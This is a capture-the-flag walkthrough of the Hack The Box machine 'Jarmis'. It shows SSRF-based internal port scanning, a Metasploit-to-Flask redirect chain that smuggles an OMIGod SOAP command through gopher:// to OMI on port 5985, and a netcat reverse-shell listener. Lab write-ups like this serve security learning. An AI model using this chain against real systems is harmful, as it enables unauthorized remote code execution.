## Overview

Jarmis is a hard-difficulty Linux machine whose web app is a JARM (TLS server fingerprint) search engine. The API's `/fetch` endpoint connects out to any URL you give it — a server-side request forgery. We use it to scan localhost, find an internal Microsoft OMI service, and reach it through a `gopher://` redirect chain to land a shell via the OMIGod vulnerability. This post stops at the foothold / `user.txt`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | — |
| 80   | nginx   | redirects to vhost `jarmis.htb` (JARM search API) |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.238 | grep ^[0-9] | cut -d/ -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV 10.129.95.238
```

Browsing the site hangs until you add `jarmis.htb` (the front-end calls `http://jarmis.htb`). The app is a search engine for JARM signatures, exposing an API under `/api/v1/` with `search/id/<n>`, `search/signature`, and `fetch` endpoints (documented at `/docs`).

## Enumeration

The `/fetch` endpoint takes a URL and connects to it to compute its JARM — a clear SSRF. Pointing it at `localhost` ports turns it into an internal port scanner: the JSON `endpoint` field is populated only when the port is open.

```bash
curl -s -H 'Host: jarmis.htb' 'http://10.129.95.238/api/v1/fetch?endpoint=http://localhost:5985'
wfuzz -z range,1-65535 --hs '"endpoint":"null"' --hc 502 -u 'http://10.129.95.238/api/v1/fetch?endpoint=http://localhost:FUZZ'
```

This reveals internal ports **5985/5986**. On Linux those are Microsoft OMI (Open Management Infrastructure), not WinRM — a strong lead toward OMIGod (CVE-2021-38647).

![internal OMI port](/assets/Images/jarmis-003_enum_signal-omi-5985.png)

Dumping the signature database shows the API only makes its redirect-following "metadata" request when the queried server's JARM is flagged **malicious**. Several malicious fingerprints are listed — including `Metasploit`.

```bash
for i in $(seq 0 222); do curl -s -H 'Host: jarmis.htb' http://10.129.95.238/api/v1/search/id/$i >> jarms.json; echo >> jarms.json; done
```

![malicious JARM entries](/assets/Images/jarmis-001_enum_lead-malicious-jarm.png)

## Foothold

To weaponize the SSRF we need our server to present a malicious JARM so the API makes its redirect-following request, then steer that request through `gopher://` to the internal OMI port. `gopher://` carries no headers, so the URL body becomes a raw HTTP POST — exactly what's needed to deliver an OMIGod SOAP request.

Stand up a Metasploit TLS server (its JARM matches the blacklisted `Metasploit` entry) that redirects to a small Flask app; the Flask app 301-redirects to a `gopher://127.0.0.1:5985/_<urlencoded POST>` carrying the OMIGod `ExecuteShellCommand` SOAP body.

```bash
# msf TLS server (malicious JARM) -> redirect ; URIPATH / so it serves the fetch
msfconsole -q -r msf.rc       # jarmisredirect: SSL true, SRVPORT 8443, URIPATH /, RedirectURL https://<lhost>:9443/
# Flask (TLS) -> 301 gopher://127.0.0.1:5985/_<OMIGod SOAP POST>
python3 omigod_flask.py
# listener for the shell
nc -lvnp 4444
```

![redirect chain](/assets/Images/jarmis-002_exploit_redirect-chain.png)

Submitting our server as the endpoint fires the chain: the API computes our JARM (malicious) → makes the metadata request → follows `msf 8443 → Flask 9443 → gopher → OMI 5985`. OMI executes the SOAP `ExecuteShellCommand` with no auth header and runs our payload.

```bash
curl -s -H 'Host: jarmis.htb' 'http://10.129.95.238/api/v1/fetch?endpoint=https://<lhost>:8443'
```

## User flag

```bash
cat /home/*/user.txt   # HTB{...}
```

A shell lands on our listener and the user flag is read. Access achieved through the JARM SSRF → gopher → OMIGod chain.
